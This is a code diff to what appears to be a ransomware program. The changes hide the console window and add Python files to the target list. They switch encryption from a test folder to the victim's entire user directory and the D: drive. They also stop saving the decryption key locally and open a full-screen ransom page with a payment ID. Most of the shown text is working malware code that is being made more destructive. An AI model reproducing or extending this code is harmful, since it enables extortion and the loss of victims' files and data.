@@ -27,7 +27,7 @@ const char extensions[][7] = {
   "gif", "gz", "h", "htm", "html", "i3d", "ico", "inf", "ini", "ino", "iso",
   "jar", "jpeg", "jpg", "js", "json", "m2", "md", "mkv", "mod", "mov", "mp3",
   "mp4", "mpeg", "mpg", "log", "odt", "pas", "pdf", "php", "png", "ppt",
-  "pptx", "rar", "raw", "rtf", "rpx", "sav", "sql", "svg", "swf", "tar",
+  "pptx", "py", "rar", "raw", "rtf", "rpx", "sav", "sql", "svg", "swf", "tar",
   "txt", "vbs", "wav", "wma", "wmv", "xls", "xml", "xps", "zip"
 };
 
@@ -114,41 +114,44 @@ void SearchFiles(const char* sDir, const uint8_t* key) {
 
 int main() {
   /// HIDE CONSOLE
-  // Delete the next two slashes to hide console:
 #ifdef _WIN32
-  //FreeConsole();
+  FreeConsole();
 #endif
 
+  // Warning!!! This is all the security you will get.
+  // Remove the line below under your own risk
   if (KillSwitch()) exit(EXIT_FAILURE);
 
   /// GENERATE KEY
   char* id; unsigned int len;
   uint8_t* key = advandedRNG(id, len, time(NULL) ^ clock());
-  printf("After payment, use the next id to generate your key: ");
-  PrintBase64(id, len);
-  printf("You can also use it to decrypt one file for free!\n");
-  delete[] id;
 
   /// SAVE KEY TO FILE
-  FILE* kfile = fopen("key.bin", "wb");
-  fwrite(key, sizeof(uint8_t), 32, kfile);
-  fclose(kfile);
+//  FILE* kfile = fopen("key.bin", "wb");
+//  fwrite(key, sizeof(uint8_t), 32, kfile);
+//  fclose(kfile);
 
   /// ENCRYPT FILES
-  // Encrypt Files in those folders and subfolders:
 #ifdef _WIN32
   DWORD length = UNLEN + 1;
   char username[length];
   GetUserName(username, &length);
   char* path = new char[length + 12];
   sprintf(path, "C:\\Users\\%s", username);
+
+  /// Encrypt Files in those folders and subfolders:
   // Encrypt user folder
-  //SearchFiles(path, key);
-  // Encrypt example folder
+  SearchFiles(path, key);
+  // Encrypt example folder (use always two backslashes)
   SearchFiles("..\\testfolder", key);
+  // Encrypt disk "D:\"
+  SearchFiles("D:\\", key);
 #else
+  // On linux use a single slash
   SearchFiles("../testfolder", key);
 #endif
+
+  delete[] key;
 
   /// GET TIME OF TOMORROW
   time_t timenow = time(NULL) + 24 * 60 * 60;
@@ -177,13 +180,14 @@ int main() {
   fscanf(loadip, "%u.%u.%u.%u", &ip[0], &ip[1], &ip[2], &ip[3]);
   fclose(loadip);
 
-  /// ADD IP
+  /// ADD IP TO FILE
   fseek(cryptowall, 1775, SEEK_SET);
   // ip may have different lengths: 0.0.0.0 / 255.255.255.255, pad with spaces
   char ipbuffer[16] = "               ";
   int ip_pad = sprintf(ipbuffer, "%u.%u.%u.%u", ip[0], ip[1], ip[2], ip[3]);
   ipbuffer[ip_pad] = ' '; // Remove '\0' set by sprintf
   fwrite(ipbuffer, sizeof(char), 15, cryptowall);
+  remove("ip");
 
   /// ADD Total Files Encrypted
   fseek(cryptowall, 1965, SEEK_SET);
@@ -203,14 +207,21 @@ int main() {
   system("start /b cmd /c \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" -new-window cryptowall\\index.htm");
   system("fullscreen.vbs");
 #else
-  //system("firefox -new-window cryptowall/index.htm");
+  system("firefox -new-window cryptowall/index.htm &");
   sleep(2);
   system("xdotool key Alt+Tab");
   sleep(1);
   system("xdotool key F11");
 #endif
 
-  remove("ip");
-  delete[] key;
+  printf("\nAfter payment, use the next id to generate your key: ");
+  PrintBase64(id, len);
+  printf("You can also use it to decrypt one file for free!\n");
+
+  /// SAVE ID TO FILE
+  FILE* idfile = fopen("ID.txt", "wb");
+  fwrite(id, sizeof(uint8_t), len, idfile);
+  fclose(idfile);
+  delete[] id;
   return 0;
 }
